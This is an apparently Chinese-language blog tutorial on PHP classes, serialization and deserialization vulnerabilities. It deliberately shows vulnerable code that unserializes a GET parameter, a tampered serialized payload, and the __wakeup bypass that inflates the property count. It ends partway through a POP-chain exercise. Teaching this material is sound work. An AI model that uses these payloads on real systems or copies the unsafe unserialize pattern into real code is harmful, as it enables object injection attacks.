+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;我被创造出来了&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>析构函数<code>__destruct()</code></li>
+</ol>
+<p>当这个类没用了会被内存销毁，同时执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;我死了&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>不知道叫什么<code>__wakeup()</code></li>
+</ol>
+<p>该函数会在反序列化时触发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">__wkaeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;我回来了，孩子们。&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>其他方法</li>
+</ol>
+<p><code>__toString</code>	反序列化的时候对象被输出在模板的时候调用</p>
+<p><code>__call</code>		调用不存在的方法的时候调用</p>
+<p><code>__invoke</code>	把一个对象当作函数使用的时候调用</p>
+<h3 id="关于面向对象的补充">关于面向对象的补充
+</h3><p>既然有公有的(public)成员变量，那么是否有私有的呢🤔？有的兄弟，有的。</p>
+<p>我们这里把age变量改为私有(private，不可继承)或保护(protected，可继承)或并预设一个量。</p>
+<p>此时就不能在初始化对象时重新设置它的年龄。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">People</span><span class="p">{</span>   <span class="c1">//定义类
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//成员变量
+</span></span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$job</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//成员方法
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">speak</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hello，我叫&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;，年龄&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s1">&#39;，我是一个&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">job</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>   <span class="c1">//$this可类比python中的self，旨在访问当前类中的变量
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">People</span><span class="p">();</span>	<span class="c1">//初始化对象
+</span></span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;小明&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">job</span> <span class="o">=</span> <span class="s1">&#39;学生&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">speak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>除非我们在类中定义一个成员方法(function) 专门用来修改这个私有变量，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">setAge</span><span class="p">(</span><span class="nv">$age</span><span class="p">){</span>	<span class="c1">//函数名字不固定，重要的是括号里的参数
+</span></span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在初始化对象时调用这个方法即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">People</span><span class="p">{</span>   <span class="c1">//定义类
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//成员变量
+</span></span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$job</span> <span class="o">=</span> <span class="s1">&#39;学生&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//成员方法
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">speak</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hello，我叫&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;，年龄&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s1">&#39;，我是一个&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">job</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>   <span class="c1">//$this可类比python中的self，旨在访问当前类中的变量
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">setAge</span><span class="p">(</span><span class="nv">$age</span><span class="p">){</span>	<span class="c1">//函数名字不固定，重要的是括号里的参数
+</span></span></span><span class="line"><span class="cl">  		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">People</span><span class="p">();</span>	<span class="c1">//初始化对象
+</span></span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;小明&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">setAge</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$c1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c1</span><span class="o">-&gt;</span><span class="na">speak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="序列化">序列化
+</h3><p>上面我们创造了c1这个人对象，但是如果想要发送这个对象不能只依赖复制粘贴，必须使用一种更高效的方法，相当于把复杂的数据压缩为连续的字符串而不丢失信息，这就是序列化。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$c1_zip</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$c1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//输出：O:6:&#34;People&#34;:3:{s:4:&#34;name&#34;;s:6:&#34;小明&#34;;s:3:&#34;age&#34;;i:18;s:3:&#34;job&#34;;s:6:&#34;学生&#34;;}
+</span></span></span><span class="line"><span class="cl"><span class="c1">//Object名people(6个字)：(含3个变量){string类型，4个字，变量名name}。。。。以此类推
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在我们可以将这串序列化后的字符串传输到其他地方，当需要还原的时候就使用反序列化。</p>
+<p>那么如果是非公有的变量被序列化之后呢？以上上方代码块中的形式为例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;People&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;小明&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;*age&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">16</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;Peoplejob&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;学生&#34;</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到两个非公有的变量其字数和数字标的对不上（例如<code>*age</code>标为6个字），这是因为有内容被屏蔽了，我们来补全它</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;People&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;小明&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;%00*%00age&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">16</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;%00People%00job&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;学生&#34;</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">实际上就是</span><span class="o">*</span><span class="nx">的前后各一个</span><span class="o">%</span><span class="mo">00</span><span class="nx">，然后类</span><span class="o">+</span><span class="nx">变量的形式在类的前后各一个</span><span class="o">%</span><span class="mo">00</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而<code>%00</code>作为截断符算1个字，这样是不是就对上了。</p>
+<p><code>%00</code>无法被肉眼观测，也无法复制粘贴，所以我们要用base64的方法来传输：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$c1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//输出：Tzo2OiJQZW9wbGUiOjM6e3M6NDoibmFtZSI7czo2OiLlsI/mmI4iO3M6NjoiACoAYWdlIjtpOjE2O3M6MTE6IgBQZW9wbGUAam9iIjtzOjY6IuWtpueUnyI7fQ==
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="反序列化">反序列化
+</h3><p>可以看到，仅仅使用了这串字符串就还原了对象的所有变量，你也可以把它字面类比为人设。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">People</span><span class="p">{</span>   <span class="c1">//定义类
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//成员变量
+</span></span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$job</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//成员方法
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">speak</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hello，我叫&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;，年龄&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s1">&#39;，我是一个&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">job</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>   <span class="c1">//$this可类比python中的self，旨在访问当前类中的变量
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  		<span class="k">echo</span> <span class="s1">&#39;反序列化程序启动&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;调用防火墙审核&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">  	<span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  			<span class="k">echo</span> <span class="s1">&#39;我死了&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2_zip</span> <span class="o">=</span> <span class="s1">&#39;O:6:&#34;People&#34;:3:{s:4:&#34;name&#34;;s:6:&#34;小明&#34;;s:3:&#34;age&#34;;i:18;s:3:&#34;job&#34;;s:6:&#34;学生&#34;;}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$c2_zip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2</span><span class="o">-&gt;</span><span class="na">speak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我们接受到的是base64加密过的序列就给它套一层解码就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$c2_zip</span> <span class="o">=</span> <span class="s1">&#39;Tzo2OiJQZW9wbGUiOjM6e3M6NDoibmFtZSI7czo2OiLlsI/mmI4iO3M6NjoiACoAYWdlIjtpOjE2O3M6MTE6IgBQZW9wbGUAam9iIjtzOjY6IuWtpueUnyI7fQ==&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$c2_zip</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞利用">漏洞利用
+</h3><p>如果要利用反序列化的漏洞，那么一般是这样的情景：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">People</span><span class="p">{</span>   <span class="c1">//定义类
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//成员变量
+</span></span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$job</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//成员方法
+</span></span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">speak</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hello，我叫&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">.</span><span class="s1">&#39;，年龄&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">.</span><span class="s1">&#39;，我是一个&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">job</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>   <span class="c1">//$this可类比python中的self，旨在访问当前类中的变量
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  			<span class="k">echo</span> <span class="s1">&#39;反序列化程序启动&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;调用防火墙审核&lt;/br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2_zip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;man&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$c2_zip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c2</span><span class="o">-&gt;</span><span class="na">speak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们只要在浏览器里给man传参即可，而且显然我们也可以对手上的序列进行一些修改，以输入自己想要的数据。比如我们把学生改为&rsquo;teacher&rsquo;，同时把字数改为7（原本一个汉字算三个字）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;People&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;小明&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;age&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">18</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;job&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;teacher&#34;</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这样并不能突破<code>__wakeup()</code>函数，很可能被防火墙拦截。</p>
+<p>解决方案：把变量数+1，即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;People&#34;</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;小明&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;age&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">18</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;job&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;teacher&#34;</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="小练习">小练习
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Aurora</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Aurora</span> <span class="o">=</span> <span class="s2">&#34;i am aurora&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="k">new</span> <span class="nx">L</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">L</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;i am L--action&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
